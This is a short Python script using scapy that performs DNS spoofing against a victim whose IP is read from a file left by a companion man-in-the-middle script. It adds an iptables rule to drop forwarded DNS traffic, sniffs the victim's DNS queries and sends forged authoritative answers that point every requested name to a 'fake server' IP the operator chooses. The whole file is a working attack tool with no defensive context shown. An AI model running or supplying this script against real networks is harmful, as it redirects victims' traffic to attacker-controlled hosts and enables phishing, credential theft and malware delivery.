from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP, Ether, sendp, UDP
from subprocess import Popen, PIPE
import sys

file1 = open('id.txt', 'r')
victimIP = file1.read()
if victimIP == "":
    print("You must first run the mitm.py script")
    sys.exit()
file1.close()
print("Please chose the ip of the fake server:")
gotoIP = input()

firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
Popen([firewall], shell=True, stdout=PIPE)

while True:
    a=sniff(promisc=1, count=1, filter="udp and port 53 and host " + victimIP)
    if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
        spoof = (Ether())/IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, aa = 1, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
        sendp(spoof, count=1)
